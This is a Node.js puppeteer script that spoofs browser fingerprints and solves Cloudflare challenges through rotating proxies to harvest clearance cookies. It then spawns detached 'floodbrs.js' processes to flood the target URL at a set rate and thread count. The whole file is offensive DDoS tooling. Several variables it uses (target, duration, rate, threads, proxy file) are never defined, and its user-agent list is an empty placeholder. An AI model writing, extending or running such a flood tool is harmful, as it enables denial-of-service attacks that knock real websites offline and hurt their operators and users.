const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 5;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== ENHANCED FIREWALL BYPASS TECHNIQUES ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        // Enhanced automation detection removal
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [1, 2, 3, 4, 5],
            configurable: true
        });
        
        // Override the permissions API
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ? 
                Promise.resolve({ state: Notification.permission }) : 
                originalQuery(parameters)
        );

        // Mock Chrome runtime completely
        window.chrome = {
            runtime: {
                connect: () => ({ onDisconnect: { addListener: () => {} } }),
                sendMessage: () => {},
                onMessage: { addListener: () => {} }
            },
            loadTimes: () => ({}),
            csi: () => ({}),
            app: { isInstalled: false },
            webstore: { onInstallStageChanged: {}, onDownloadProgress: {} }
        };

        // Spoof WebGL
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.';
            if (parameter === 37446) return 'Intel Iris OpenGL Engine';
            if (parameter === 34076) return 'WebKit WebGL';
            if (parameter === 34077) return 'WebKit WebGL';
            return getParameter.apply(this, arguments);
        };

        // Spoof audio context fingerprint
        const originalGetChannelData = AudioBuffer.prototype.getChannelData;
        AudioBuffer.prototype.getChannelData = function() {
            const result = originalGetChannelData.apply(this, arguments);
            const len = result.length;
            for (let i = 0; i < len; i += 100) {
                result[i] += (Math.random() * 0.0001) - 0.00005;
            }
            return result;
        };

        // Bypass headless detection
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en'],
            configurable: true
        });

        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: 8,
            configurable: true
        });

        Object.defineProperty(navigator, 'deviceMemory', {
            value: 8,
            configurable: true
        });

        // Remove headless Chrome indicators
        delete navigator.__proto__.webdriver;
    });

    // Additional stealth measures
    await page.setUserAgent(randomElement(userAgents));
    await page.setViewport({
        width: 1920 + Math.floor(Math.random() * 100),
        height: 1080 + Math.floor(Math.random() * 100),
        deviceScaleFactor: 1,
        hasTouch: false,
        isLandscape: false,
        isMobile: false
    });

    // Block unnecessary resources
    await page.setRequestInterception(true);
    page.on('request', (req) => {
        const resourceType = req.resourceType();
        if (['image', 'font', 'media'].includes(resourceType)) {
            req.abort();
        } else {
            req.continue();
        }
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-infobars',
    '--window-position=0,0',
    '--ignore-certificate-errors',
    '--ignore-certificate-errors-spki-list',
    '--disable-web-security',
    '--disable-features=IsolateOrigins,site-per-process',
    '--disable-site-isolation-trials',
    '--disable-blink-features=AutomationControlled',
    '--no-default-browser-check',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-component-update',
    '--no-first-run',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--disable-backgrounding-occluded-windows',
    '--disable-client-side-phishing-detection',
    '--disable-popup-blocking',
    '--disable-prompt-on-repost',
    '--disable-hang-monitor',
    '--disable-sync',
    '--disable-domain-reliability',
    '--disable-ipc-flooding-protection',
    '--disable-back-forward-cache',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--hide-scrollbars',
    '--metrics-recording-only',
    '--mute-audio',
    '--password-store=basic',
    '--use-mock-keychain',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    `--user-agent=${randomElement(userAgents)}`,
    '--remote-debugging-port=0'
];

// Enhanced challenge detection and solving
const solveAdvancedChallenge = async (page, browserProxy) => {
    try {
        console.log(`[DEBUG] Solving challenge for proxy: ${maskProxy(browserProxy)}`);
        
        // Wait longer for challenge to load
        await page.waitForTimeout(5000 + Math.random() * 3000);

        const url = page.url();
        const title = await page.title().catch(() => '');
        const content = await page.content().catch(() => '');

        console.log(`[DEBUG] Current URL: ${url}`);
        console.log(`[DEBUG] Page title: ${title}`);

        // Enhanced challenge detection
        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           title.includes('Attention Required') ||
                           content.includes('challenge-platform') ||
                           content.includes('cf-browser-verification') ||
                           url.includes('challenges.cloudflare.com') ||
                           content.includes('cf_captcha_kind');

        if (!isChallenge) {
            console.log(`[DEBUG] No challenge detected`);
            return true;
        }

        console.log(`[DEBUG] Challenge detected, attempting to solve...`);

        // Strategy 1: Wait for auto-redirect (most common)
        try {
            await page.waitForNavigation({ 
                waitUntil: 'networkidle2', 
                timeout: 20000 
            });
            console.log(`[DEBUG] Auto-redirect successful`);
            return true;
        } catch (e) {
            console.log(`[DEBUG] Auto-redirect failed: ${e.message}`);
        }

        // Strategy 2: Look for challenge iframe
        const challengeFrame = await page.$('iframe[src*="challenges"], iframe[src*="captcha"]');
        if (challengeFrame) {
            console.log(`[DEBUG] Found challenge iframe`);
            try {
                const frame = await challengeFrame.contentFrame();
                if (frame) {
                    // Wait for challenge to load in iframe
                    await frame.waitForTimeout(3000);
                    
                    // Try to find and click submit button
                    const submitButton = await frame.$(
                        'input[type="submit"], button[type="submit"], .btn, #challenge-submit, [class*="submit"], [class*="button"]'
                    );
                    
                    if (submitButton) {
                        await submitButton.click({ delay: 100 + Math.random() * 200 });
                        console.log(`[DEBUG] Clicked submit button in iframe`);
                        await page.waitForTimeout(8000);
                        return true;
                    }
                }
            } catch (frameError) {
                console.log(`[DEBUG] Iframe interaction failed: ${frameError.message}`);
            }
        }

        // Strategy 3: Direct page interaction
        const pageSubmitButton = await page.$(
            'input[type="submit"], button[type="submit"], .btn, #challenge-submit, [class*="submit"], [class*="button"]'
        );
        
        if (pageSubmitButton) {
            console.log(`[DEBUG] Found submit button on main page`);
            await pageSubmitButton.click({ delay: 100 + Math.random() * 200 });
            await page.waitForTimeout(8000);
            return true;
        }

        // Strategy 4: Advanced human simulation
        console.log(`[DEBUG] Attempting human simulation`);
        await simulateAdvancedHumanBehavior(page);
        
        // Strategy 5: Try form submission
        const forms = await page.$$('form');
        for (const form of forms) {
            try {
                await form.evaluate(form => form.submit());
                console.log(`[DEBUG] Submitted form`);
                await page.waitForTimeout(5000);
                break;
            } catch (e) {}
        }

        // Final wait and check
        await page.waitForTimeout(10000);
        
        const newUrl = page.url();
        if (!newUrl.includes('challenges.cloudflare.com')) {
            console.log(`[DEBUG] Challenge appears to be solved`);
            return true;
        }

        console.log(`[DEBUG] All challenge solving strategies failed`);
        return false;

    } catch (error) {
        console.log(`[DEBUG] Error in challenge solving: ${error.message}`);
        return false;
    }
};

const simulateAdvancedHumanBehavior = async (page) => {
    try {
        // Random mouse movements
        const viewport = page.viewport();
        const moves = 5 + Math.floor(Math.random() * 8);
        
        for (let i = 0; i < moves; i++) {
            const x = Math.random() * viewport.width;
            const y = Math.random() * viewport.height;
            await page.mouse.move(x, y, { 
                steps: 10 + Math.floor(Math.random() * 20) 
            });
            await page.waitForTimeout(100 + Math.random() * 300);
        }

        // Random scrolling
        const scrollAmount = Math.random() * 1000;
        await page.evaluate((amount) => {
            window.scrollBy(0, amount);
        }, scrollAmount);

        await page.waitForTimeout(1000 + Math.random() * 2000);

        // More random movements
        await page.mouse.move(
            Math.random() * viewport.width,
            Math.random() * viewport.height,
            { steps: 5 }
        );

    } catch (error) {
        // Ignore mouse movement errors
    }
};

// Enhanced proxy handling with authentication
const setupProxy = (browserProxy) => {
    if (!browserProxy) return null;
    
    const proxyParts = browserProxy.split(':');
    if (proxyParts.length === 2) {
        // IP:PORT format
        return `--proxy-server=http://${browserProxy}`;
    } else if (proxyParts.length === 4) {
        // IP:PORT:USERNAME:PASSWORD format
        return `--proxy-server=http://${proxyParts[0]}:${proxyParts[1]}`;
    }
    return null;
};

// Enhanced browser launch with proxy authentication
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 3) => {
    const userAgent = randomElement(userAgents);
    let browser = null;

    const launchOptions = {
        headless: "new",
        args: [
            ...getFirewallBypassArgs(),
            '--disable-web-security',
            '--disable-features=IsolateOrigins,site-per-process',
            '--disable-site-isolation-trials'
        ],
        defaultViewport: {
            width: 1920 + Math.floor(Math.random() * 100),
            height: 1080 + Math.floor(Math.random() * 100),
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: false
        },
        ignoreHTTPSErrors: true
    };

    // Add proxy if available
    const proxyArg = setupProxy(browserProxy);
    if (proxyArg) {
        launchOptions.args.push(proxyArg);
    }

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching browser (attempt ${attempt}/${maxRetries}) with proxy: ${maskProxy(browserProxy)}`);
        
        browser = await puppeteer.launch(launchOptions);
        const [page] = await browser.pages();

        // Set user agent before navigation
        await page.setUserAgent(userAgent);

        // Apply enhanced bypass techniques
        await bypassFirewall(page);

        // Handle proxy authentication if needed
        const proxyParts = browserProxy.split(':');
        if (proxyParts.length === 4) {
            await page.authenticate({
                username: proxyParts[2],
                password: proxyParts[3]
            });
        }

        // Set longer timeouts
        page.setDefaultNavigationTimeout(60000);
        page.setDefaultTimeout(30000);

        // Navigate to target
        await page.goto(targetURL, {
            waitUntil: 'networkidle2',
            timeout: 60000
        });

        // Solve challenges
        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
        if (!challengeSolved) {
            throw new Error('Challenge solving failed');
        }

        // Verify we have access to the target page
        const finalUrl = page.url();
        if (finalUrl.includes('challenges.cloudflare.com') || 
            finalUrl.includes('captcha') ||
            (await page.title()).includes('Just a moment')) {
            throw new Error('Still on challenge page after solving attempt');
        }

        // Get cookies
        const cookies = await page.cookies();
        if (!cookies || cookies.length === 0) {
            throw new Error('No cookies obtained');
        }

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        coloredLog(COLORS.GREEN, `[SUCCESS] Got cookies for proxy: ${maskProxy(browserProxy)}`);
        totalSolves++;
        
        await browser.close();
        return {
            title: await page.title(),
            browserProxy,
            cookies: cookieString,
            userAgent
        };

    } catch (error) {
        coloredLog(COLORS.RED, `[ERROR] Attempt ${attempt} failed for ${maskProxy(browserProxy)}: ${error.message}`);
        
        if (browser) {
            try {
                await browser.close();
            } catch (e) {}
        }

        if (attempt < maxRetries) {
            const delay = Math.pow(2, attempt) * 1000; // Exponential backoff
            await sleep(delay / 1000);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        
        return null;
    }
};

// Enhanced thread management
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[FAILED] Max retries reached for proxy: ${maskProxy(browserProxy)}`);
        done(null, { task, currentTask: queue.length() });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        
        if (response) {
            if (response.title.includes('Just a moment') || response.title.includes('Checking your browser')) {
                coloredLog(COLORS.RED, `[INFO] Challenge bypass incomplete for proxy: ${maskProxy(browserProxy)}`);
                await startThread(targetURL, browserProxy, task, done, retries + 1);
                return;
            }

            // Log success
            const cookieInfo = {
                Page: response.title,
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                cookie: response.cookies.substring(0, 50) + '...' // Truncate for display
            };
            
            coloredLog(COLORS.GREEN, `[SUCCESS] Obtained cookies: ${JSON.stringify(cookieInfo, null, 2)}`);

            // Spawn flood process
            try {
                coloredLog(COLORS.YELLOW, `[INFO] Spawning floodbrs for proxy: ${maskProxy(browserProxy)}`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });
                
                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[INFO] Successfully spawned floodbrs process`);
                
            } catch (spawnError) {
                coloredLog(COLORS.RED, `[ERROR] Failed to spawn floodbrs: ${spawnError.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        coloredLog(COLORS.RED, `[ERROR] Thread error: ${error.message}`);
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Rest of your existing utility functions remain the same...
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// Enhanced user agents
const userAgents = [
    // Add your user agents here...
];

// Initialize queue
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All proxies processed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found in file');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Launching with ${proxies.length} proxies, ${threads} threads, ${duration}s duration`);
    
    // Add all proxies to queue
    proxies.forEach(proxy => {
        queue.push({ browserProxy: proxy });
    });

    // Set timeout for automatic shutdown
    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time limit reached, shutting down...');
        queue.kill();
        
        // Cleanup processes
        exec('pkill -f "node.*floodbrs"', () => {
            coloredLog(COLORS.GREEN, '[INFO] Cleanup completed');
            process.exit(0);
        });
    }, duration * 1000);
};

// Error handling
process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[FATAL] Uncaught Exception: ${error.message}`);
});

process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[FATAL] Unhandled Rejection: ${error.message}`);
});

// Start the application
coloredLog(COLORS.GREEN, '[INFO] Starting browser automation...');
main().catch(err => {
    coloredLog(COLORS.RED, `[FATAL] Main execution failed: ${err.message}`);
    process.exit(1);
});
